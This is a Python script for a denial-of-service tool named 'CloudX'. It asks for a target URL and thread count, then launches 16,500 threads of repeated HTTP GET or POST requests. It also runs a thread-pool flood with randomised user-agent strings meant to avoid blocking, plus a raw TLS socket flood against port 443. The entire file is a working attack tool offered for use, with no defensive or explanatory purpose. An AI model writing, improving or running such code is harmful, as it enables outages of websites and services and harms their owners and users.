import threading
import requests
import random
import os
import time
import socket
import ssl
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

os.system('clear')
print("POST Method is currently being fixed and it is error right now, please use GET instead.")
logo = """
< =============== >
      CloudX
^ <=============> ^
"""
print(logo)

# Variables for STELLAR attack
url_stellar = input("[+] Enter a URL for STELLAR attack: ")
timer_stellar = input("[+] Enter the attack timer for STELLAR (in seconds): ")
threads_stellar = input("[+] Enter the number of threads for STELLAR: ")
print("")
print("Additional layer, keep the url same")
# Variables for existing attack
url = input("[+] Enter a URL to attack: ")
ip = input("[+] Enter the target IP address: ")
port = input("[+] Enter the target port (default: 80): ")
numberOfThreads = input("[+] Enter the desired number of threads (default: 16500): ")
method = input("[+] Enter either 'GET' or 'POST' as the request method (default: GET): ")
print("[Check Traffic!]")
time.sleep(0.5)

# Construct attack parameters (User Agent)
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Connection': 'close'
}

USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': ['Linux x86_64', 'Linux i386'],
            'ext': ['X11']
        },
        'windows': {
            'name': ['Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2'],
            'ext': ['WOW64', 'Win64; x64']
        },
        'mac': {
            'name': ['Macintosh'],
            'ext': ['Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10)]
        },
    },
    'platform': {
        'webkit': {
            'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30)],
            'details': ['KHTML, like Gecko'],
            'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30)] + ['Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10)]
        },
        'iexplorer': {
            'browser_info': {
                'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
                'ext_pre': ['compatible', 'Windows; U'],
                'ext_post': ['Trident/%d.0' % i for i in range(4, 6)] + ['.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10)]
            }
        },
        'gecko': {
            'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30)],
            'details': [],
            'extensions': []
        }
    }
}

def attack(threadNum):
    session = requests.Session()
    session.headers.update(headers)
    while True:
        try:
            if method == "GET":
                for _ in range(6500):
                    response = session.get(url)
                    print("[*] Thread (%s) | Attack Sent! Status Code: %s" % (threadNum, response.status_code))
            else:
                for _ in range(6500):
                    response = session.post(url)
                    print("[*] Thread (%s) | Attack Sent! Status Code: %s" % (threadNum, response.status_code))
        except requests.RequestException as e:
            print("[*] Thread (%s) | Request failed! Error: %s" % (threadNum, str(e)))

def flood_url():
    while True:
        user_agent = ' '.join([random.choice(USER_AGENT_PARTS['platform'][k]) for k in USER_AGENT_PARTS['platform']])
        user_agent += ' (' + random.choice(USER_AGENT_PARTS['platform']['webkit']['name']) + ')'
        headers['User-Agent'] = user_agent
        time.sleep(0.1)  # Added delay to reduce rate of requests and avoid being blocked
        requests.get(url, headers=headers)

def attackSTELLAR(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()

def LaunchSTELLAR(url, timer):
    timelol = time.time() + int(timer)
    req = "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(USER_AGENT_PARTS['platform']['webkit']['name']) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

def concurrent_flood_url():
    with ThreadPoolExecutor(max_workers=500) as executor:
        while True:
            user_agent = ' '.join([random.choice(USER_AGENT_PARTS['platform'][k]) for k in USER_AGENT_PARTS['platform']])
            user_agent += ' (' + random.choice(USER_AGENT_PARTS['platform']['webkit']['name']) + ')'
            headers['User-Agent'] = user_agent
            executor.submit(requests.get, url, headers=headers)

# MULAI MANGG
default_threads = 16500
for i in range(default_threads):
    threading.Thread(target=attack, args=(i,)).start()
threading.Thread(target=concurrent_flood_url).start()

attackSTELLAR(url_stellar, timer_stellar, threads_stellar)

# NOTE
"""
CloudX is under development, so don't have high expectations about this. alright?
"""
